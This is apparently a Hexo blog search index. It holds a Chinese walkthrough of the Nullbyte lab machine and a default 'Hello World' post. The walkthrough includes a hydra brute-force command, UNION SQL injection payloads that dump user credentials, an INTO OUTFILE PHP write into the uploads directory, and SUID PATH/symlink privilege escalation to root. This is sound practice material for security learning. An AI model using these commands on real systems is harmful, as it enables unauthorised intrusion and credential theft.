<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/03/24/Nullbyte/wp/"/>
    <url>/2024/03/24/Nullbyte/wp/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><blockquote><p>主机发现：<br><img src="/./20240129101754.png" alt="Pasted image 20240129101754.png"></p></blockquote><blockquote><p>全端口扫描：</p></blockquote><p>![[Pasted image 20240129102003.png]]</p><blockquote><p>详细信息扫描：</p></blockquote><p>![[Pasted image 20240129102256.png]]</p><blockquote><p>从rpcinfo感觉可能需要用到udp端口，多扫下udp：</p></blockquote><p>![[Pasted image 20240129102413.png]]</p><blockquote><p>只开了rpcbind和一个网络配置服务(zeroconf)，看来无需udp</p></blockquote><blockquote><p>接着脚本扫描：</p></blockquote><p>![[Pasted image 20240129103324.png]]</p><blockquote><p>枚举出了phpmyadmin和uploads页面，思路转到web渗透</p></blockquote><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><blockquote><p>先打开目录爆破：</p></blockquote><p>![[Pasted image 20240129103549.png]]</p><blockquote><p>访问web服务：</p></blockquote><p>![[Pasted image 20240129103707.png]]</p><blockquote><p>只有一个图片，先下载，等待目录爆破结果：</p></blockquote><p>![[Pasted image 20240129103858.png]]</p><p>![[Pasted image 20240129104111.png]]</p><blockquote><p>然而没什么新的有效信息，顺着访问phpmyadmin和uploads</p></blockquote><p>![[Pasted image 20240129104229.png]]</p><blockquote><p>uploads说我们没有权限查看该目录的列表，但是推测可以通过&#x2F;uploads&#x2F;shell.php访问内容</p></blockquote><p>![[Pasted image 20240129104423.png]]</p><blockquote><p>常规的登录界面，测试注入无果<br>线索只剩了main.gif，推测其中有信息隐写</p></blockquote><h3 id="exiftool查看图片信息"><a href="#exiftool查看图片信息" class="headerlink" title="exiftool查看图片信息"></a>exiftool查看图片信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exiftool main.gif<br></code></pre></td></tr></table></figure><p>![[Pasted image 20240129105658.png]]</p><blockquote><p>在图片详细信息中就发现了一段文字kzMb5nVYJw<br>先保存到hint.txt</p></blockquote><p>![[Pasted image 20240129105812.png]]</p><blockquote><p>尝试直接做phpmyadmin登录、ssh登录，全部失败<br>尝试抓包对uploads目录直接上传文件，失败<br>尝试gif图片隐写检查，失败</p></blockquote><blockquote><p>突然突发奇想，ctf比赛时为了防止目录爆破经常起奇怪的文件名，尝试将这段文字当作路径，居然还真成功了：</p></blockquote><p>![[Pasted image 20240129111550.png]]</p><blockquote><p>接着对着这个页面是一顿测注入，能测的都测了一遍，结果发现这页面不能执行sql语句，大概率就没连着数据库。就是一个单纯的验证key的界面，目前只能期望hydra爆破能走通了…</p></blockquote><h3 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h3><p>参考：[[入门打靶 (5台wp)#hydra密码爆破]]</p><p>![[Pasted image 20240129115826.png]]</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.130 -s 80 http-post-form <span class="hljs-string">&quot;/kzMb5nVYJw/index.php:key=^PASS^&amp;ps=^USER^:invalid key&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>根据抓取的数据包构造以上爆破语句，用rockyou成功爆破出key<br>登录：</p></blockquote><p>![[Pasted image 20240129120028.png]]</p><blockquote><p>登录后终于来到有查询功能的页面，抓包开测注入：</p></blockquote><p>![[Pasted image 20240129120206.png]]</p><blockquote><p>确认存在sql注入，且是”型，测万能语句“or 1#</p></blockquote><p>![[Pasted image 20240129120930.png]]</p><blockquote><p>测出列数为3：</p></blockquote><p>![[Pasted image 20240129121036.png]]</p><blockquote><p>尝试写马：</p></blockquote><p>^9f8a8a</p><p>![[Pasted image 20240129121458.png]]</p><blockquote><p>失败，可能是路径猜测错误，也可能是没有权限<br>老老实实查内容：</p></blockquote><p>![[Pasted image 20240129121826.png]]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; union select 6,7,group_concat(schema_name) from information_schema.schemata#<br></code></pre></td></tr></table></figure><blockquote><p>两个库最感兴趣：phpmyadmin、seth<br>先查phpmyadmin：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; union select 6,7,group_concat(table_name) from information_schema.tables where table_schema=&#x27;phpmyadmin&#x27;#<br></code></pre></td></tr></table></figure><p>![[Pasted image 20240129122106.png]]</p><blockquote><p>说实话看到这个前缀就感觉不会有什么有用信息，但保险起见还是看看这两个和user相关的表：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; union select 6,7,group_concat(column_name) from information_schema.columns where table_name=&#x27;pma_userconfig&#x27;#<br></code></pre></td></tr></table></figure><p>![[Pasted image 20240129122509.png]]</p><blockquote><p>果然是两张空表<br>转回seth库：</p></blockquote><p>![[Pasted image 20240129122622.png]]</p><blockquote><p>只有users表：</p></blockquote><p>![[Pasted image 20240129122701.png]]</p><blockquote><p>把数据全dump出来：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; union select 6,7,group_concat(id,0x7c,user,0x7c,pass,0x7c,position,0x7c) from users#<br></code></pre></td></tr></table></figure><p>![[Pasted image 20240129123017.png]]</p><blockquote><p>得到一个ramses的凭据：<br>id：ramses<br>pass：YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE </p></blockquote><blockquote><p>解码：</p></blockquote><p>![[Pasted image 20240129123408.png]]</p><p>![[Pasted image 20240129123609.png]]</p><p>![[Pasted image 20240129123657.png]]</p><blockquote><p>成功解出最终凭据：<br>ramses@omega</p></blockquote><blockquote><p>尝试登录ssh、phpmyadmin：</p></blockquote><h2 id="0x03-获得立足点-ssh777端口"><a href="#0x03-获得立足点-ssh777端口" class="headerlink" title="0x03 获得立足点(ssh777端口)"></a>0x03 获得立足点(ssh777端口)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -p 777 ramses@10.10.10.130<br></code></pre></td></tr></table></figure><p>![[Pasted image 20240129124316.png]]</p><blockquote><p>ssh登录成功，直接拿到了立足点，感觉无需再去尝试phpmyadmin的登录<br>开始做信息收集，先完善tty：</p></blockquote><p>![[Pasted image 20240129124545.png]]</p><blockquote><p>1、枚举home目录，都无写权限，放弃写公钥横向提权</p></blockquote><p>![[Pasted image 20240129125018.png]]</p><blockquote><p>2、sudo枚举，没有任何结果</p></blockquote><p>![[Pasted image 20240129125043.png]]</p><blockquote><p>3、自动任务枚举：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/cron<br></code></pre></td></tr></table></figure><p>![[Pasted image 20240129125122.png]]</p><blockquote><p>4、s位枚举：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>![[Pasted image 20240129125249.png]]</p><blockquote><p>一眼看到最特殊的&#x2F;var&#x2F;www&#x2F;backup&#x2F;procwatch，基本可以肯定它有问题<br>且gtfobins查询其余文件均无法s位提权</p></blockquote><h2 id="0x04-suid提权"><a href="#0x04-suid提权" class="headerlink" title="0x04 suid提权"></a>0x04 suid提权</h2><p>![[Pasted image 20240129131211.png]]</p><blockquote><p>很遗憾只有执行权限，先执行一次看看：</p></blockquote><p>![[Pasted image 20240129131254.png]]</p><blockquote><p>好像是执行了一次ps和sh的操作，并把ps的结果返回了？<br>感觉可以软链接提权：</p></blockquote><p>![[Pasted image 20240129131427.png]]</p><blockquote><p>因为不太熟悉这种提权方式，不知道为什么不太行…<br>突然想到可以劫持ps的环境变量，实现指向sh：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">export</span> PATH=.:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p>![[Pasted image 20240129131630.png]]</p><blockquote><p>成功提权</p></blockquote><p>![[Pasted image 20240129131903.png]]</p><blockquote><p>拿到凭证</p></blockquote><h2 id="0x05-自我反思补足"><a href="#0x05-自我反思补足" class="headerlink" title="0x05 自我反思补足"></a>0x05 自我反思补足</h2><h3 id="sql注入写马"><a href="#sql注入写马" class="headerlink" title="sql注入写马"></a>sql注入写马</h3><p>尝试位置链接：[[pentest&#x2F;打靶&#x2F;1. Nullbyte&#x2F;wp#^9f8a8a|wp]]</p><p>![[Pasted image 20240129121458.png]]</p><blockquote><p>当时还向&#x2F;tmp目录写做了尝试，打完后发现tmp的确实写进去了</p></blockquote><p>![[Pasted image 20240129164356.png]]</p><blockquote><p>查看web根目录权限，发现是因为mysql用户并无该目录的写权限</p></blockquote><p>![[Pasted image 20240129164821.png]]</p><p>![[Pasted image 20240129164847.png]]</p><h3 id="软链接提权"><a href="#软链接提权" class="headerlink" title="软链接提权"></a>软链接提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s &lt;target&gt; &lt;link_name&gt;<br></code></pre></td></tr></table></figure><blockquote><p>link_name为被劫持文件</p></blockquote><p>![[Pasted image 20240129173257.png]]</p><blockquote><p>首先被劫持文件不能已经存在，否则报错<br>其次如果想要强制替换已存在的被劫持文件，参数可改为-sf，但也需要有写权限</p></blockquote><p>![[Pasted image 20240129173426.png]]</p><blockquote><p>所以一般情况下，软链接提权要和环境变量劫持一同使用，如下：<br>(由于当前目录也有写权限，直接把当前目录写入环境变量即可)</p></blockquote><p>![[Pasted image 20240129173901.png]]</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /bin/sh ps<br></code></pre></td></tr></table></figure><blockquote><p>即在当前目录生成一个ps文件，并软链接指向&#x2F;bin&#x2F;sh</p></blockquote><blockquote><p>之后执行 <code>./procwatch</code> 触发root sh</p></blockquote><p>![[Pasted image 20240129174258.png]]</p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><ol><li>端口扫描：80 web服务，777 ssh服务</li><li>web渗透：从图片详细信息得到隐藏路径，在sql注入失败的情况下对隐藏路径的登录key值进行爆破，成功进到连接数据库的查询页面；使用联合查询对其注入，得到用户信息，解码后为ssh凭据</li><li>提权：通过ssh获得立足点，枚举发现root身份的s位脚本文件，该脚本以root身份执行ps命令；通过劫持ps命令的执行文件，换为执行sh，获得root shell；此处亦可通过软链接劫持ps命令达到相同效果</li></ol><h2 id="0x07-看wp及视频后反思补足"><a href="#0x07-看wp及视频后反思补足" class="headerlink" title="0x07 看wp及视频后反思补足"></a>0x07 看wp及视频后反思补足</h2><blockquote><p>对于自我反思补足部分的勘误补足：<br>虽然&#x2F;var&#x2F;www&#x2F;html目录整体并无写入权限，但是存在uploads页面，不妨大胆推测此处可进行写操作，尝试对&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads写马：</p></blockquote><p>![[Pasted image 20240129192752.png]]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&quot; union select 6,7,&#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;/var/www/html/uploads/info.php&#x27;#<br></code></pre></td></tr></table></figure><p>![[Pasted image 20240129192852.png]]</p><blockquote><p>接着写马弹shell即可</p></blockquote><blockquote><p>反思：盲打阶段虽然考虑到了尝试写马，但当发现不能直接写到网站根目录时放弃过早，即使没有从uploads的名字联想到可以写数据，也应该根据目录爆破结果逐个尝试(intruder)</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/03/22/hello-world/"/>
    <url>/2024/03/22/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
